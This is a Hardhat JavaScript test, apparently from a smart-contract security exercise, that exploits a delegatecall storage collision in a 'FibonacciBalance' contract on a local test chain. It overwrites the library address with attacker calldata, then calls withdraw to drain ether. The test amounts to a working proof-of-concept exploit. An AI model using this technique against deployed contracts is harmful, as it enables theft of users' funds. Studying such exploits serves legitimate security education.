const assert = require("assert");
const { ethers } = require("hardhat");

async function waitDeployed(contract) {
  if (!contract) throw new Error("No contract provided to waitDeployed");
  if (typeof contract.waitForDeployment === "function") {
    await contract.waitForDeployment();
    return;
  }
  if (contract.deployTransaction) {
    await contract.deployTransaction.wait();
    return;
  }
  if (typeof contract.deployed === "function") {
    await contract.deployed();
    return;
  }
}

describe("FibonacciBalance - access control / delegatecall exploit", function () {
  let deployer, attacker;
  let fibLib, victim, malicious;

  beforeEach(async function () {
    [deployer, attacker] = await ethers.getSigners();

    const FibLibFactory = await ethers.getContractFactory(
      "FibonacciLib",
      deployer
    );
    fibLib = await FibLibFactory.deploy();
    await waitDeployed(fibLib);

    const fibLibAddress = fibLib.target || fibLib.address;
    assert.ok(fibLibAddress, "FibonacciLib should have a valid address");

    const VictimFactory = await ethers.getContractFactory(
      "FibonacciBalance",
      deployer
    );
    victim = await VictimFactory.deploy(fibLibAddress, {
      value: ethers.parseEther("10"),
    });
    await waitDeployed(victim);

    const victimAddress = victim.target || victim.address;
    assert.ok(victimAddress, "Victim contract should have valid address");

    const MaliciousFactory = await ethers.getContractFactory(
      "MaliciousLib",
      attacker
    );
    malicious = await MaliciousFactory.deploy();
    await waitDeployed(malicious);
  });

  it("should allow attacker to replace fibonacciLibrary via fallback and drain funds", async function () {
    const victimAddress = victim.target || victim.address;
    const maliciousAddress = malicious.target || malicious.address;

    const initialVictimBal = await ethers.provider.getBalance(victimAddress);
    assert.strictEqual(
      initialVictimBal.toString(),
      ethers.parseEther("10").toString(),
      "victim initial balance 10 ETH"
    );

    // 生成对 setStart(uint256) 的调用数据
    const libIface = new ethers.Interface(["function setStart(uint256)"]);
    const dataSetStart = libIface.encodeFunctionData("setStart", [
      maliciousAddress,
    ]);

    // 通过 fallback delegatecall 修改 fibonacciLibrary
    await attacker.sendTransaction({
      to: victimAddress,
      data: dataSetStart,
      gasLimit: 100000,
    });

    const libAddr = await victim.fibonacciLibrary();
    assert.strictEqual(
      libAddr.toLowerCase(),
      maliciousAddress.toLowerCase(),
      "fibonacciLibrary should be replaced by malicious.address"
    );

    const beforeVictimBal = await ethers.provider.getBalance(victimAddress);
    assert.strictEqual(
      beforeVictimBal.toString(),
      ethers.parseEther("10").toString(),
      "victim balance before withdraw still 10 ETH"
    );

    const attackerBalBefore = await ethers.provider.getBalance(
      attacker.address
    );

    const tx = await victim.connect(attacker).withdraw({ gasLimit: 300000 });
    await tx.wait();

    const afterVictimBal = await ethers.provider.getBalance(victimAddress);
    const expectedVictimBal = ethers.parseEther("5");
    assert.strictEqual(
      afterVictimBal.toString(),
      expectedVictimBal.toString(),
      "victim should have 5 ETH remaining"
    );

    const calcFib = await victim.calculatedFibNumber();
    assert.strictEqual(
      calcFib.toString(),
      "5",
      "calculatedFibNumber should be set to 5"
    );

    const attackerBalAfter = await ethers.provider.getBalance(attacker.address);
    assert.ok(
      attackerBalAfter > attackerBalBefore - ethers.parseEther("0.1"),
      "attacker balance should increase (allowing gas costs)"
    );
  });
});
